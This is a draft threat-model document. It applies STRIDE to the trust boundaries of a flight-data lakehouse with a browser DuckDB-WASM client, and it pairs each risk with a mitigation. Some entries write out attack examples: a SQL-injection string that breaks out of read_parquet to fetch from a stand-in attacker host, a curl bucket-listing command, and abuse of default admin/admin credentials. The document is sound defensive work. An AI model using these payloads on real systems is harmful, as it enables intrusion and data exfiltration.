---
type: security
title: Threat Model — Trust Boundaries & STRIDE Enumeration
tags: [security, threat-model, stride, data-flow]
status: draft
updated: 2026-08-08
---

# Threat Model — Trust Boundaries & STRIDE

> Adversarial read of the design in [[architecture-summary]], [[serving-service]], [[frontend-backend-split]], [[iceberg-duckdb]], [[ingestion-backfill]]. Feeds [[access-control]], [[abuse-and-cost]], [[privacy-compliance]], [[security-summary]]. Method: STRIDE over each trust boundary. Severity per `rules/common/code-review.md` (CRITICAL/HIGH/MEDIUM/LOW).

> [!warning] Missing upstream
> No `vault/platform/*` exists at time of writing ([[staff-platform-engineer]] note not authored). Network isolation, TLS termination, secret storage, and public exposure of SeaweedFS/Nessie/Postgres are **assumed insecure by default** (the `docker-compose.yml` posture) until platform proves otherwise. All controls below that mention hosting/network are **requirements on [[staff-platform-engineer]]**.

## 1. Trust boundaries & data flow

```
 [UNTRUSTED]                                   TB1                 [SEMI-TRUSTED EDGE]
 Browser (DuckDB-WASM) ──HTTP byte-range──►  SeaweedFS S3 (frontend-exports, ANON Read+List)
 Browser ── jsDelivr CDN ──► DuckDB-WASM bundle (3rd-party origin)          │
      │                                                                     │
      │ TB2 (API auth)                                                      │ TB3 (storage authz)
      ▼                                                                     ▼
 FastAPI serving ──►  Redis (fresh-signal cache, quota buckets)     SeaweedFS S3 (raw-flights = FULL warehouse)
      │  │  │                                                        Nessie REST catalog (19120)  Postgres (5432)
      │  │  └── model artifact load (from SeaweedFS)  ◄── TB6 (artifact integrity)
      │  └── fresh-signal pulls: NOAA/FAA/OpenWeather/paid feed  ◄── TB5 (untrusted external responses)
      ▼
 Dagster (Iceberg writes, backfill)  ◄── TB4 (BTS ZIP + OpenSky = untrusted external input)
 [PHASE 2] Browser ── upload CSV/JSON itinerary ──► API ──► per-tenant storage  ◄── TB7 (multi-tenant)
```

**Where untrusted input enters:** browser query params (TB1/TB2), uploaded itineraries (TB7), external-API responses (TB5), source files — BTS ZIP / OpenSky JSON (TB4).
**Where sensitive data crosses a boundary:** personal itineraries (TB7 → storage, logs), API keys/session tokens (TB2), S3/API/model secrets (TB3/TB6), the *entire* `raw-flights` warehouse sitting on the same S3 node that the browser talks to (TB1↔TB3 co-location).

## 2. STRIDE per boundary (concrete)

### TB1 — Browser ↔ `frontend-exports` (anonymous public bucket)
- **(I) Information disclosure — anon `List` grant.** `.env.example`: `s3.configure -user=anonymous -buckets=frontend-exports -actions=Read,List`. **`List` lets any unauthenticated caller enumerate every object** (`GET /frontend-exports?list-type=2`), discovering all `{ICAO}/*.parquet` prefixes and *anything mistakenly written there*. Attack: `curl 'http://s3/frontend-exports/'` → full inventory. **HIGH.** → Control in [[access-control]]: drop `List`, `Read`-only + explicit key convention; put a CDN in front so the origin bucket is never directly listable. OWASP A01.
- **(S/T) MITM — plain HTTP.** `client.ts` base `http://localhost:8333`; SeaweedFS runs `ssl off` (compose). In prod a browser reading Parquet over HTTP → tamper/injection of aggregate data + no confidentiality. **HIGH.** → TLS mandatory (platform).
- **(D) Egress wallet attack.** Anonymous, unbounded byte-range reads → CDN/egress cost amplification; a script loops full-file GETs across every ICAO prefix. **MEDIUM.** → [[abuse-and-cost]] (CDN cache + per-IP bandwidth cap).
- **(T) Supply chain — jsDelivr worker.** `client.ts` `getJsDelivrBundles()` + `importScripts("${bundle.mainWorker}")` in a Blob worker. A jsDelivr/CDN compromise or DNS hijack executes attacker JS in-page (can exfiltrate Phase-2 session tokens). **HIGH.** → self-host the DuckDB-WASM bundle + SRI + strict CSP (`script-src 'self'`), per `rules/web/security.md`. OWASP A08.

### TB1b — user-influenced DuckDB-WASM SQL (latent injection / SSRF)
- **(E/I) `read_parquet('${url}')` string interpolation.** `queries.ts::queryRouteTimeliness` and `queryFlightLookup` interpolate `airportIcao` straight into `read_parquet('<url>')`. Today `airportIcao` is "internal config" (comment-asserted) — but it is one route-param/Phase-2-personalization change away from being user-controlled. Once it is: attacker sets `airportIcao = "x')); ATTACH ... ; SELECT * FROM read_parquet('http://attacker/x"` → **arbitrary-URL fetch via httpfs (client-side SSRF/exfil) + SQL breakout** (read other buckets, `read_csv` of any URL). `searchTerm` is correctly parameterized; the **URL is not**. **HIGH (latent; CRITICAL if `airportIcao` becomes user-supplied).** → allowlist-validate every path segment against `^[A-Z]{4}$` (ICAO) *before* interpolation; never interpolate a raw URL. OWASP A03.

### TB2 — Browser ↔ FastAPI (auth + metering)
- **(S) API-key exposure in a browser client.** [[product-shape-by-tier]] gives Plus/Pro consumers `/v1/predict`. If the tier "API key" ships in the SPA bundle/XHR, anyone opens devtools and lifts a key that carries a paid quota → account/quota theft + cost. **CRITICAL.** → consumer tiers must use short-lived backend-minted session tokens (OAuth/OIDC), never a static API key in JS; static keys only for B2B server-to-server. Detail in [[access-control]]. OWASP A07.
- **(E) Tier/quota bypass.** See [[access-control]] + [[abuse-and-cost]].
- **(T) Replay.** No TLS/idempotency stated → replay a captured `/v1/predict`. **MEDIUM.** → TLS + short token TTL.

### TB3 — Storage authz (SeaweedFS / Nessie / Postgres)
- **(E/I) Default credentials `admin/admin`.** `docker-compose.yml` defaults `SEAWEEDFS_ACCESS_KEY:-admin` / `SECRET_KEY:-admin`; Postgres `dagster/dagster`; Nessie uses the same S3 secret. The S3 `admin` user has `Read,Write,List,Tagging,Admin` on **all** buckets incl. `raw-flights` (whole warehouse). If any of ports 8333/19120/5432/9333 are reachable in prod with defaults → **full lakehouse read/write/delete + model-artifact overwrite**. **CRITICAL.** → generated secrets, no defaults, network-isolate; requirement on [[staff-platform-engineer]]. OWASP A05/A07.
- **(T) Unauthenticated Nessie catalog.** Compose exposes Nessie REST (19120) with no auth. Anyone who reaches it can repoint `main` at attacker-controlled Parquet → **serving/edge read poisoned data** (bad predictions, or a malicious Parquet that drives the interpolation bug above). **CRITICAL.** → auth + private network (platform).
- **(I) Co-location.** The same SeaweedFS instance the browser hits for `frontend-exports` also stores `raw-flights`. A single S3 authz misconfig exposes raw per-flight data. **HIGH.** → separate public edge origin (CDN/dedicated bucket) from the private warehouse endpoint. OWASP A01.

### TB4 — Ingestion (BTS ZIP / OpenSky) → Dagster/Iceberg
- **(T) Zip bomb / malicious archive.** BTS monthly `.zip` is fetched + unzipped; a hijacked mirror or MITM (verify HTTPS + terms per [[ingestion-backfill]]) could serve a decompression bomb → Dagster worker OOM/disk-fill DoS. **MEDIUM.** → bounded decompression (size/entry caps), stream-parse, checksum. OWASP A03/A08.
- **(T) Data poisoning.** Untrusted CSV rows appended to the spine skew base rates. **LOW-MEDIUM.** → dbt `unique`/range tests ([[ingestion-backfill]] §3) as a security control, not just quality.

### TB5 — Fresh-signal external responses (NOAA/FAA/OpenWeather/paid feed)
- **(T) Untrusted response injection.** METAR/GDP/NOTAM text flows into features and possibly into `reason_codes[]` → response → rendered in the SPA. Unsanitized NOTAM free-text → stored/reflected XSS in the browser. **MEDIUM.** → schema-validate (Pydantic) every external response; escape on render; never string-concat into SQL. OWASP A03.
- **(A) Upstream outage → stale serve.** Covered by freshness contract ([[feature-contract]] §B) — enforce "mark stale, degrade," never silently serve stale.

### TB6 — Model artifact load (SeaweedFS → FastAPI)
- **(E) Deserialization RCE.** [[feature-contract]] loads a versioned model artifact from SeaweedFS at boot. If artifacts are pickle/joblib (typical for sklearn/GBM) and an attacker can write to the bucket (see TB3 default creds / weak authz), a poisoned artifact executes arbitrary code **in the serving process** on load. **CRITICAL.** → sign artifacts (checksum + signature verified before load), restrict write to a CI identity, prefer non-pickle formats (ONNX/`booster.save_model`), load in a locked-down context. OWASP A08.

### TB7 — Phase-2 multi-tenant uploads
- **(I/E) Cross-tenant read (IDOR).** Uploaded personal itineraries; if presigned URLs or DuckDB reads are not tenant-scoped, user A reads user B's history. **CRITICAL** for Phase 2. Full analysis + presigned-URL rules in [[access-control]].
- **(T) Upload parser abuse.** CSV/JSON parse: formula/CSV injection, zip bomb, SSRF via URL fields, DuckDB `read_csv` on untrusted bytes. See [[access-control]] §uploads + [[abuse-and-cost]].

## 3. Boundary summary (must-fix vs harden)

| Boundary | Top risk | Sev | Phase |
|---|---|---|---|
| TB3 | default `admin/admin`, open Nessie/PG | CRITICAL | before build |
| TB6 | model-artifact deserialization RCE | CRITICAL | before serving |
| TB2 | API key in browser client | CRITICAL | before paid launch |
| TB7 | cross-tenant itinerary read | CRITICAL | before Phase 2 |
| TB1 | anon `List`, HTTP, CDN supply chain | HIGH | before public launch |
| TB1b | `read_parquet` URL interpolation | HIGH (latent) | before any user-supplied path |
| TB4/TB5 | zip bomb, external-response XSS | MEDIUM | hardening |

## Handoffs
- → [[staff-product-engineer]]: TB1b, TB2, TB6, TB7 are design constraints (validation, token model, artifact format, tenant scoping).
- → [[staff-platform-engineer]]: TB3 (secrets/isolation), TB1 (TLS/CDN), Nessie/PG auth. **Flagged: no platform note exists.**
- → [[access-control]], [[abuse-and-cost]], [[privacy-compliance]] for controls; [[security-summary]] ranks all.

## Sources
- Repo: `docker-compose.yml`, `.env.example`, `frontend/src/db/client.ts`, `frontend/src/db/queries.ts` — accessed 2026-08-08
- [[serving-service]], [[frontend-backend-split]], [[iceberg-duckdb]], [[ingestion-backfill]], [[feature-contract]], [[architecture-summary]] — accessed 2026-08-08
- OWASP Top 10 (2021) A01/A03/A05/A07/A08; `rules/web/security.md`, `rules/common/security.md`, `rules/common/code-review.md`
